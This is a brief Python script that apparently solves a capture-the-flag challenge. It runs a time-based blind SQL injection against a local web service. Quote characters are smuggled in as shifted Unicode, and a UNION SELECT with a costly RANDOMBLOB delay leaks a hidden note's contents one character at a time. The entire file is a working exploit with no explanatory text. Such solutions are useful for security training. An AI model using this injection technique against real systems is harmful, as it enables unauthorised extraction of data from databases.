import httpx
import string
import time

URL = "http://localhost:7012"

def safe_char(c: str) -> str:
    return chr(ord(c) + 256)


async def query(client: httpx.AsyncClient, query: str) -> dict:
    response = await client.get(f"{URL}/__data.json", params={"q": query})
    return response.json()


async def main():
    found = ""
    alphabet = string.ascii_letters + string.digits + "_{}"
    async with httpx.AsyncClient() as client:
        while not found.endswith("}"):
            for c in alphabet:
                start = time.perf_counter()
                await query(client, f"{safe_char("'")} UNION SELECT * FROM note WHERE hidden AND substr(content,{len(found)+1},1)={safe_char("'")}{c}{safe_char("'")} AND 23=RANDOMBLOB(1000000000/2)--a-")
                elapsed = time.perf_counter() - start
                if elapsed > 0.5:
                    found += c
                    print(found)
                    break
    print(found)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
